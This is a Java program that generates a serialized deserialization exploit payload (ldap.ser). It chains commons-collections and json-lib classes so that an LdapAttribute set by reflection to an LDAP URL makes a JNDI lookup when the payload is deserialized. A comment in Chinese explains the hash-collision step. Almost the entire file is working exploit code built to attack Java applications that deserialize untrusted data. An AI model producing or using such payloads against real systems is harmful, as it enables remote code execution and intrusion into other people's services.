import net.sf.json.JSONArray;
import org.apache.commons.collections.comparators.NullComparator;
import org.apache.commons.collections.map.Flat3Map;
import org.apache.commons.collections.set.ListOrderedSet;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.concurrent.ConcurrentSkipListSet;

/**
 * @Author: iswin
 * @Date: 2022/1/7 2:57 下午
 */
public class Payload_LDAP_JNDI {

    public static void main(String[] args) throws Exception{
        Class c1 = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor constructor_1 = c1.getDeclaredConstructor(String.class);
        constructor_1.setAccessible(true);
        Object o = constructor_1.newInstance("iswin");
        Field f_1 = o.getClass().getDeclaredField("baseCtxURL");
        f_1.setAccessible(true);
        f_1.set(o, "ldap://127.0.0.1:21001");

        ConcurrentSkipListSet sets = new ConcurrentSkipListSet(new NullComparator());
        sets.add(o);

        ListOrderedSet set = new ListOrderedSet();
        JSONArray array = new JSONArray();
        array.add("\u0915\u0009\u001e\u000c\u0002\u0915\u0009\u001e\u000b\u0004");


        Field f_2 = set.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("collection");
        f_2.setAccessible(true);
        f_2.set(set, array);

        Flat3Map map = new Flat3Map();
        map.put(set, true);
        map.put(sets, true);

        //如果不在这里更改值，则满足不了hash相等条件，如果在之前设置为空，那么在Flat3Map的put方法时就会触发漏洞，则不能完成生成payload。
        Field f_3 = o.getClass().getSuperclass().getDeclaredField("attrID");
        f_3.setAccessible(true);
        f_3.set(o, "");

        byte[] bt = serialize(map);
        deserialize(bt);
        FileOutputStream fos = new FileOutputStream(new File("ldap.ser"));
        fos.write(bt);
        fos.flush();
        fos.close();
    }

    private static byte[] serialize (Object o) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.flush();
        return baos.toByteArray();
    }

    private static void deserialize (byte[] bt) throws Exception{
        ByteArrayInputStream bais = new ByteArrayInputStream(bt);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
